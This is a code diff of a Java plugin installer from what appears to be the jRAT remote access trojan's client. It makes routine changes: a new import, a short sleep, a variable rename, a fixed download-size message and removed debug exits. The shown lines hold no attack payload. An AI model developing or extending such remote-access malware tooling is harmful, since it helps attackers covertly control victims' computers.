@@ -21,6 +21,7 @@ import pro.jrat.client.exceptions.MissingKeyException;
 import pro.jrat.client.listeners.ExtensionInstallerListener;
 import pro.jrat.client.net.WebRequest;
 import pro.jrat.common.codec.Hex;
+import pro.jrat.common.hash.Md5;
 import pro.jrat.common.listeners.CopyStreamsListener;
 import pro.jrat.common.utils.IOUtils;
 
@@ -63,6 +64,8 @@ public class ExtensionInstaller {
 		HttpURLConnection archiveConnection = (HttpURLConnection) WebRequest.getConnection(Constants.HOST + "/plugins/getplugin.php?plugin=" + plugin.getName() + "&key=" + key);
 		archiveConnection.setConnectTimeout(15000);
 		archiveConnection.connect();
+		
+		Thread.sleep(500L);
 
 		int response = archiveConnection.getResponseCode();
 
@@ -74,31 +77,25 @@ public class ExtensionInstaller {
 			throw new InvalidKeyException("Key not found, not valid license?");
 		}
 
-		InputStream archive = archiveConnection.getInputStream();
+		InputStream in = archiveConnection.getInputStream();
 
 		final int length = archiveConnection.getContentLength();
 
 		FileOutputStream out = new FileOutputStream(temp);
-		
-		
 
-		IOUtils.copy(length, archive, out, new CopyStreamsListener() {
+		IOUtils.copy(length, in, out, new CopyStreamsListener() {
 			@Override
 			public void chunk(long current, long total, int percent) {
 				if (length == -1) {
 					listener.status(Color.black, "Downloaded " + (current / 1024L) + " kB", (int) current, -1);
 				} else {
-					listener.status(Color.black, "Downloaded " + (current / 1024L) + "/" + total + " kB", (int) current, -1);
+					listener.status(Color.black, "Downloaded " + (current / 1024L) + "/" + (total / 1024L) + " kB", (int) current, -1);
 				}
 			}
 		});
 
-		archive.close();
-		out.close();
-		
-		System.out.println(temp.getAbsolutePath());
-		
-		System.exit(0);
+        out.close();
+        in.close();
 
 		ZipFile zip = new ZipFile(temp);
 		Enumeration<? extends ZipEntry> entriesEnum = zip.entries();
